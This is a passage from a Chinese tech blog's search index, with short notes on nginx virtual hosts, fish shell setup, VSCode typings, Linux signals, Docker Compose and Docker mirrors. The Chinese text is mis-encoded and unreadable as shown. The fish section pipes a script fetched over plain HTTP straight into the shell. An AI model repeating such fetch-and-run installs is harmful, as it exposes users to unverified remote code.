class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  &quot;&quot;;</span><br><span class="line">    return       444;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬è®¾ç½®ä¸»æœºåä¸ºç©ºå­—ç¬¦ä¸²ä»¥åŒ¹é…æœªå®šä¹‰â€œHostâ€å¤´çš„è¯·æ±‚ï¼Œè€Œä¸”è¿”å›äº†ä¸€ä¸ªnginxç‰¹æœ‰çš„ï¼Œéhttpæ ‡å‡†çš„è¿”å›ç 444ï¼Œå®ƒå¯ä»¥ç”¨æ¥å…³é—­è¿æ¥ã€‚</p><blockquote><p>ä»0.8.48ç‰ˆæœ¬å¼€å§‹ï¼Œè¿™å·²æˆä¸ºä¸»æœºåçš„é»˜è®¤è®¾ç½®ï¼Œæ‰€ä»¥å¯ä»¥çœç•¥<code>server_name &quot;&quot;</code>ã€‚è€Œä¹‹å‰çš„ç‰ˆæœ¬ä½¿ç”¨æœºå™¨çš„<code>hostname</code>ä½œä¸ºä¸»æœºåçš„é»˜è®¤å€¼ã€‚</p></blockquote><h3 id="åŸºäºåŸŸåå’ŒIPæ··åˆçš„è™šæ‹Ÿä¸»æœº"><a href="#åŸºäºåŸŸåå’ŒIPæ··åˆçš„è™šæ‹Ÿä¸»æœº" class="headerlink" title="åŸºäºåŸŸåå’ŒIPæ··åˆçš„è™šæ‹Ÿä¸»æœº"></a>åŸºäºåŸŸåå’ŒIPæ··åˆçš„è™šæ‹Ÿä¸»æœº</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen      192.168.1.1:80;</span><br><span class="line">    server_name example.org www.example.org;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen      192.168.1.1:80;</span><br><span class="line">    server_name example.net www.example.net;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen      192.168.1.2:80;</span><br><span class="line">    server_name example.com www.example.com;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé…ç½®ä¸­ï¼Œnginx é¦–å…ˆæµ‹è¯•è¯·æ±‚çš„ IP åœ°å€å’Œç«¯å£æ˜¯å¦åŒ¹é…æŸä¸ª server é…ç½®å—ä¸­çš„ listen æŒ‡ä»¤é…ç½®ã€‚æ¥ç€ nginx ç»§ç»­æµ‹è¯•è¯·æ±‚çš„ Host å¤´æ˜¯å¦åŒ¹é…è¿™ä¸ª server å—ä¸­çš„æŸä¸ª server_name çš„å€¼ã€‚å¦‚æœä¸»æœºåæ²¡æœ‰æ‰¾åˆ°ï¼Œnginx å°†æŠŠè¿™ä¸ªè¯·æ±‚äº¤ç»™é»˜è®¤è™šæ‹Ÿä¸»æœºå¤„ç†ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªä» 192.168.1.1:80 ç«¯å£æ”¶åˆ°çš„è®¿é—® <a href="http://www.example.com/">www.example.com</a> çš„è¯·æ±‚å°†è¢«ç›‘å¬ 192.168.1.1:80 ç«¯å£çš„é»˜è®¤è™šæ‹Ÿä¸»æœºå¤„ç†ï¼Œæœ¬ä¾‹ä¸­å°±æ˜¯ç¬¬ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå› ä¸ºè¿™ä¸ªç«¯å£ä¸Šæ²¡æœ‰å®šä¹‰åä¸º <a href="http://www.example.com/">www.example.com</a> çš„è™šæ‹Ÿä¸»æœºã€‚  </p><blockquote><p>é¦–å…ˆåŒ¹é…listenç„¶ååŒ¹é…serverï¼Œå¦‚æœæ²¡æœ‰å…¨åŒ¹é…çš„ï¼Œé‚£å°±ç”¨ç¬¬ä¸€ä¸ªåŒ¹é…ä¸Šlistençš„ã€‚</p></blockquote><p>é»˜è®¤æœåŠ¡å™¨æ˜¯ç›‘å¬ç«¯å£çš„å±æ€§ï¼Œæ‰€ä»¥ä¸åŒçš„ç›‘å¬ç«¯å£å¯ä»¥è®¾ç½®ä¸åŒçš„é»˜è®¤æœåŠ¡å™¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen      192.168.1.1:80;</span><br><span class="line">    server_name example.org www.example.org;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen      192.168.1.1:80 default_server;</span><br><span class="line">    server_name example.net www.example.net;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen      192.168.1.2:80 default_server;</span><br><span class="line">    server_name example.com www.example.com;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://tengine.taobao.org/nginx_docs/cn/docs/http/request_processing.html">Nginxå¦‚ä½•å¤„ç†ä¸€ä¸ªè¯·æ±‚</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fish-shell</title>
      <link href="/post/fish-shell.html"/>
      <url>/post/fish-shell.html</url>
      
        <content type="html"><![CDATA[<h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">brew install fish</span><br><span class="line"></span><br><span class="line">curl -L http://get.oh-my.fish | fish</span><br></pre></td></tr></table></figure><h3 id="åˆ‡æ¢è„šæœ¬"><a href="#åˆ‡æ¢è„šæœ¬" class="headerlink" title="åˆ‡æ¢è„šæœ¬"></a>åˆ‡æ¢è„šæœ¬</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /usr/local/bin/fish</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">sudo</span> -u [user] chsh -s /usr/local/bin/fish</span></span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœä¸ç”Ÿæ•ˆï¼Œé‡æ–°æ‰“å¼€Terminal</p></blockquote><h3 id="å®‰è£…ä¸»é¢˜"><a href="#å®‰è£…ä¸»é¢˜" class="headerlink" title="å®‰è£…ä¸»é¢˜"></a>å®‰è£…ä¸»é¢˜</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">omf install [&lt;name&gt;|&lt;url&gt;]</span><br></pre></td></tr></table></figure><p><a href="https://github.com/oh-my-fish/oh-my-fish/blob/master/docs/Themes.md">ä¸»é¢˜åˆ—è¡¨</a></p><h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.config/fish/config.fish</span><br></pre></td></tr></table></figure><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://github.com/oh-my-fish/oh-my-fish">ã€1ã€‘</a> <a href="http://doabit.com/posts/3-from-oh-my-zsh-to-oh-my-fish">ã€2ã€‘</a><a href="http://www.jianshu.com/p/7ffd9d1af788">ã€3ã€‘</a> <a href="https://github.com/oh-my-fish/oh-my-fish/blob/master/docs/zh-CN/FAQ.md">ã€4ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> fish </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VSCodeæ™ºèƒ½æç¤º</title>
      <link href="/post/vscode-intellisense.html"/>
      <url>/post/vscode-intellisense.html</url>
      
        <content type="html"><![CDATA[<h3 id="å®‰è£…Typings"><a href="#å®‰è£…Typings" class="headerlink" title="å®‰è£…Typings"></a>å®‰è£…Typings</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g typings</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…ç›¸å…³æç¤ºä¿¡æ¯æ–‡ä»¶"><a href="#å®‰è£…ç›¸å…³æç¤ºä¿¡æ¯æ–‡ä»¶" class="headerlink" title="å®‰è£…ç›¸å…³æç¤ºä¿¡æ¯æ–‡ä»¶"></a>å®‰è£…ç›¸å…³æç¤ºä¿¡æ¯æ–‡ä»¶</h3><h4 id="æœç´¢"><a href="#æœç´¢" class="headerlink" title="æœç´¢"></a>æœç´¢</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typings search node</span><br></pre></td></tr></table></figure><p><img src="/images/WechatIMG40.jpeg"></p><h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><blockquote><p>åœ¨æç¤ºæ–‡ä»¶åˆ—ä¸­<code>SOURCE</code>åˆ—ï¼Œæœ‰çš„æ˜¾ç¤ºæ˜¯<code>dt</code>æœ‰çš„æ˜¯<code>npm</code>å¦‚æœæ˜¯<code>dt</code>ï¼Œå®‰è£…æ—¶åº”è¯¥åœ¨åå­—å‰åŠ <code>dt~</code>ã€‚&#96;</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">typings install dt~node --global --save</span><br><span class="line">typings install lodash --save</span><br></pre></td></tr></table></figure><h4 id="ä»€ä¹ˆæ—¶å€™éœ€è¦ä½¿ç”¨-â€“global-å‚æ•°"><a href="#ä»€ä¹ˆæ—¶å€™éœ€è¦ä½¿ç”¨-â€“global-å‚æ•°" class="headerlink" title="ä»€ä¹ˆæ—¶å€™éœ€è¦ä½¿ç”¨ â€“global å‚æ•°"></a>ä»€ä¹ˆæ—¶å€™éœ€è¦ä½¿ç”¨ â€“global å‚æ•°</h4><ul><li>å¦‚æœå®‰è£…çš„åŒ…ä½¿ç”¨ script æ ‡è®°æ¥å¼•ç”¨(å¦‚ jQuery )(ä¹Ÿå°±æ˜¯åœ¨æµè§ˆå™¨ä¸­ä½¿ç”¨)</li><li>è¿™ä¸ªåŒ…æ˜¯å±äºç¯å¢ƒçš„ä¸€éƒ¨åˆ†(å¦‚ node )æ—¶</li><li>è¯¥åŒ…æ²¡æœ‰ä½¿ç”¨ â€“global å®‰è£…å¤±è´¥æ—¶</li><li>å¦‚æœæŠ¥é”™äº†è¯´éœ€è¦åŠ  global æ—¶åŠ â€“global</li></ul><h3 id="å¯ç”¨æ™ºèƒ½æç¤ºåŠŸèƒ½"><a href="#å¯ç”¨æ™ºèƒ½æç¤ºåŠŸèƒ½" class="headerlink" title="å¯ç”¨æ™ºèƒ½æç¤ºåŠŸèƒ½"></a>å¯ç”¨æ™ºèƒ½æç¤ºåŠŸèƒ½</h3><ul><li>ç¬¬ä¸€ç§æ˜¯åœ¨éœ€è¦è¿›è¡Œåªèƒ½æç¤ºçš„æ–‡ä»¶æœ€ä¸Šè¡Œå¢åŠ æç¤ºä¿¡æ¯æ–‡ä»¶æ‰€åœ¨ç›®å½•ï¼Œæ ¼å¼å¦‚ä¸‹:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/// &lt;reference path=&quot;./typings/index.d.ts&quot; /&gt;</span><br></pre></td></tr></table></figure><blockquote><p>pathä¸ºç›¸å¯¹è·¯å¾„</p></blockquote><ul><li>ç¬¬äºŒç§æ˜¯åœ¨é¡¹ç›®æ‰€åœ¨ç›®å½•(åœ¨è¿™é‡Œæ˜¯NodeSnippetæ–‡ä»¶å¤¹ä¸­)å¢åŠ ä¸€ä¸ªåä¸ºjsconfig.jsonçš„ç©ºæ–‡ä»¶ã€‚<blockquote><p><code>jsconfig.json</code>æ–¹å¼éœ€è¦é‡å¯VSCode</p></blockquote></li></ul><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.cnblogs.com/IPrograming/p/VsCodeTypings.html">ã€1ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linuxä¿¡å·æœºåˆ¶ä¸ä¿¡å·å¤„ç†</title>
      <link href="/post/linux-signal.html"/>
      <url>/post/linux-signal.html</url>
      
        <content type="html"><![CDATA[<h2 id="Linuxä¿¡å·æœºåˆ¶ä¸ä¿¡å·å¤„ç†"><a href="#Linuxä¿¡å·æœºåˆ¶ä¸ä¿¡å·å¤„ç†" class="headerlink" title="Linuxä¿¡å·æœºåˆ¶ä¸ä¿¡å·å¤„ç†"></a>Linuxä¿¡å·æœºåˆ¶ä¸ä¿¡å·å¤„ç†</h2><p>ä¿¡å·(signal)æ˜¯Linuxè¿›ç¨‹é—´é€šä¿¡çš„ä¸€ç§æœºåˆ¶ï¼Œå…¨ç§°ä¸ºè½¯ä¸­æ–­ä¿¡å·ï¼Œä¹Ÿè¢«ç§°ä¸ºè½¯ä¸­æ–­ã€‚ä¿¡å·æœ¬è´¨ä¸Šæ˜¯åœ¨è½¯ä»¶å±‚æ¬¡ä¸Šå¯¹ç¡¬ä»¶ä¸­æ–­æœºåˆ¶çš„ä¸€ç§æ¨¡æ‹Ÿã€‚</p><h3 id="å¸¸è§ä¿¡å·"><a href="#å¸¸è§ä¿¡å·" class="headerlink" title="å¸¸è§ä¿¡å·"></a>å¸¸è§ä¿¡å·</h3><p><img src="/images/QQ20161114-0@2x.jpg"><br>æ¯ç§ä¿¡å·éƒ½ä¼šæœ‰ä¸€ä¸ªé»˜è®¤åŠ¨ä½œã€‚é»˜è®¤åŠ¨ä½œå°±æ˜¯è„šæœ¬æˆ–ç¨‹åºæ¥æ”¶åˆ°è¯¥ä¿¡å·æ‰€åšå‡ºçš„é»˜è®¤æ“ä½œã€‚å¸¸è§çš„é»˜è®¤åŠ¨ä½œæœ‰ç»ˆæ­¢è¿›ç¨‹ã€é€€å‡ºç¨‹åºã€å¿½ç•¥ä¿¡å·ã€é‡å¯æš‚åœçš„è¿›ç¨‹ç­‰ï¼Œä¸Šè¡¨ä¸­ä¹Ÿå¯¹éƒ¨åˆ†é»˜è®¤åŠ¨ä½œè¿›è¡Œäº†è¯´æ˜ã€‚</p><h3 id="å‘é€ä¿¡å·"><a href="#å‘é€ä¿¡å·" class="headerlink" title="å‘é€ä¿¡å·"></a>å‘é€ä¿¡å·</h3><p>æœ‰å¤šç§æ–¹å¼å¯ä»¥å‘ç¨‹åºæˆ–è„šæœ¬å‘é€ä¿¡å·ï¼Œä¾‹å¦‚æŒ‰ä¸‹<code>&lt;Ctrl+C&gt;</code>ç»„åˆé”®ä¼šå‘é€<code>SIGINT</code>ä¿¡å·ï¼Œç»ˆæ­¢å½“å‰è¿›ç¨‹ã€‚</p><p>è¿˜å¯ä»¥é€šè¿‡ kill å‘½ä»¤å‘é€ä¿¡å·ï¼Œè¯­æ³•ä¸ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -signal pid</span><br></pre></td></tr></table></figure><p>signalä¸ºè¦å‘é€çš„ä¿¡å·ï¼Œå¯ä»¥æ˜¯ä¿¡å·åç§°æˆ–æ•°å­—ï¼›pidä¸ºæ¥æ”¶ä¿¡å·çš„è¿›ç¨‹IDã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -2 1001</span><br></pre></td></tr></table></figure><p>å°†<code>SIGINT</code>ä¿¡å·å‘é€ç»™è¿›ç¨‹IDä¸º1001çš„ç¨‹åºï¼Œç¨‹åºä¼šç»ˆæ­¢æ‰§è¡Œã€‚</p><blockquote><p>killçš„é»˜è®¤ä¿¡å·ä¸º<code>SIGTERM</code>15</p></blockquote><h3 id="æ•è·ä¿¡å·"><a href="#æ•è·ä¿¡å·" class="headerlink" title="æ•è·ä¿¡å·"></a>æ•è·ä¿¡å·</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;pid: %d&#x27;</span>, process.<span class="property">pid</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title class_">Date</span>()), <span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;SIGHUP&#x27;</span>, <span class="string">&#x27;SIGINT&#x27;</span>, <span class="string">&#x27;SIGQUIT&#x27;</span>, <span class="string">&#x27;SIGFPE&#x27;</span>, <span class="string">&#x27;SIGALRM&#x27;</span>, <span class="string">&#x27;SIGTERM&#x27;</span>].<span class="title function_">forEach</span>(<span class="function">(<span class="params">signal</span>) =&gt;</span> &#123;</span><br><span class="line">    process.<span class="title function_">on</span>(signal, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(signal);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœåœ¨ç¨‹åºä¸­æ•è·äº†ä¿¡å·ï¼Œæ²¡æœ‰åšé€€å‡ºå¤„ç†ï¼Œç¨‹åºæ˜¯ä¸ä¼šé€€å‡ºçš„ã€‚å¯ä»¥åœ¨æ•è·ä¿¡å·ååšä¸€ä¸‹æ¸…ç†å·¥ä½œç„¶åé€€å‡ºã€‚<br>å¦‚æœéœ€è¦é€€å‡ºï¼Œéœ€è¦æ‰‹åŠ¨è°ƒç”¨<code>process.exit(0)</code>ã€‚<em>ï¼ˆé0ä»£è¡¨å¼‚å¸¸é€€å‡ºï¼‰</em><br><code>SIGKILL</code>ä¿¡å·æ— æ³•ç›‘å¬ï¼Œæ— æ³•è¢«è¿›ç¨‹æ•è·ï¼Œè¿›ç¨‹ä¼šç«‹å³é€€å‡ºã€‚<strong>æ…ç”¨kill -9</strong></p></blockquote><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><ol><li><p>ä½¿ç”¨<code>kill -0</code>æ£€æŸ¥è¿›ç¨‹</p><p> <code>kill -0</code>ä¸ä¼šç»™è¿›ç¨‹å‘é€ä»»ä½•ä¿¡å·ï¼Œä½†æ˜¯ä»ä¼šæ£€æŸ¥è¿›ç¨‹æ˜¯å¦å­˜åœ¨ã€‚å¦‚æœè¿›ç¨‹å­˜åœ¨è¿”å›0ï¼Œä¸å­˜åœ¨è¿”å›1ã€‚</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">kill</span> -0 <span class="variable">$BASHPID</span> 2&gt;/dev/null; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;process <span class="variable">$BASHPID</span> existence&quot;</span> </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;process <span class="variable">$BASHPID</span> nexistence&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://c.biancheng.net/cpp/html/2784.html">Linuxä¿¡å·æœºåˆ¶ä¸ä¿¡å·å¤„ç†</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kill </tag>
            
            <tag> signal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Install-Docker-Compose</title>
      <link href="/post/Install-Docker-Compose.html"/>
      <url>/post/Install-Docker-Compose.html</url>
      
        <content type="html"><![CDATA[<h3 id="Install-Docker-Compose"><a href="#Install-Docker-Compose" class="headerlink" title="Install Docker Compose"></a>Install Docker Compose</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L &quot;https://github.com/docker/compose/releases/download/1.8.1/docker-compose-$(uname -s)-$(uname -m)&quot; &gt; /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://docs.docker.com/compose/install/">ã€1ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenRestyæ€»ç»“</title>
      <link href="/post/openresty.html"/>
      <url>/post/openresty.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://gist.github.com/tianyk/e50ba80444cd114962493589a9efd3fa">https://gist.github.com/tianyk/e50ba80444cd114962493589a9efd3fa</a></li><li><a href="http://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API">http://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API</a></li><li><a href="http://www.londonlua.org/scripting_nginx_with_lua/slides.html">http://www.londonlua.org/scripting_nginx_with_lua/slides.html</a></li><li><a href="https://github.com/iresty/nginx-lua-module-zh-wiki">https://github.com/iresty/nginx-lua-module-zh-wiki</a></li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ bin</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ openresty</span><br><span class="line">â”œâ”€â”€ COPYRIGHT</span><br><span class="line">â”œâ”€â”€ lua/                                                # é¡¹ç›®luaä»£ç </span><br><span class="line">â”‚Â Â  â””â”€â”€ auth.lua</span><br><span class="line">â”œâ”€â”€ luajit/                                             # luajit</span><br><span class="line">â”œâ”€â”€ lualib/                                             # lua ç¬¬ä¸‰æ–¹æ¨¡å—</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ nginx-jwt.lua</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ngx                                             # ngx lua æ¨¡å—</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ balancer.lua</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ ...</span><br><span class="line">â”‚Â Â  â””â”€â”€ resty                                           # openresty ç¬¬ä¸‰æ–¹æ¨¡å—</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ memcached.lua</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ ...</span><br><span class="line">â”œâ”€â”€ nginx/                                              # nginx</span><br><span class="line">â”œâ”€â”€ openssl/</span><br><span class="line">â”œâ”€â”€ pcre/</span><br><span class="line">â”œâ”€â”€ site/</span><br><span class="line">â””â”€â”€ zlib/</span><br></pre></td></tr></table></figure><p><img src="/images/openresty_phases.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>é˜¿é‡Œäº‘dockeré•œåƒåŠ é€Ÿ</title>
      <link href="/post/docker-aliyun-registrymirror.html"/>
      <url>/post/docker-aliyun-registrymirror.html</url>
      
        <content type="html"><![CDATA[<h3 id="é˜¿é‡Œäº‘Dockeré•œåƒåŠ é€Ÿ"><a href="#é˜¿é‡Œäº‘Dockeré•œåƒåŠ é€Ÿ" class="headerlink" title="é˜¿é‡Œäº‘Dockeré•œåƒåŠ é€Ÿ"></a>é˜¿é‡Œäº‘Dockeré•œåƒåŠ é€Ÿ</h3><h4 id="æ³¨å†Œç§äººé•œåƒ"><a href="#æ³¨å†Œç§äººé•œåƒ" class="headerlink" title="æ³¨å†Œç§äººé•œåƒ"></a>æ³¨å†Œç§äººé•œåƒ</h4><p><a href="http://mirror.aliyun.com/">é•œåƒåŠ é€Ÿ</a><br><img src="/images/%E9%98%BF%E9%87%8C%E4%BA%91Docker%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F.jpeg"></p><h4 id="é…ç½®åŠ é€Ÿå™¨"><a href="#é…ç½®åŠ é€Ÿå™¨" class="headerlink" title="é…ç½®åŠ é€Ÿå™¨"></a>é…ç½®åŠ é€Ÿå™¨</h4><ol><li>Ubuntu</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;DOCKER_OPTS=\&quot;\$DOCKER_OPTS --registry-mirror=ä½ çš„é•œåƒåŠ é€Ÿåœ°å€\&quot;&quot; | sudo tee -a /etc/default/docker</span><br><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure><ol start="2"><li>Centos</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i &#x27;s|OPTIONS=|OPTIONS=--registry-mirror=ä½ çš„é•œåƒåŠ é€Ÿåœ°å€|g&#x27; /etc/sysconfig/docker</span><br><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://baichuan.taobao.com/doc2/detail.htm?treeId=39&articleId=103049&docType=1">ã€1ã€‘</a><br><a href="https://cr.console.aliyun.com/#/accelerator">ã€åŠ é€Ÿå™¨ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Dockerçš„é•œåƒå­˜æ”¾ç›®å½•ä¿®æ”¹ä¸è¿ç§»</title>
      <link href="/post/docker-image-store.html"/>
      <url>/post/docker-image-store.html</url>
      
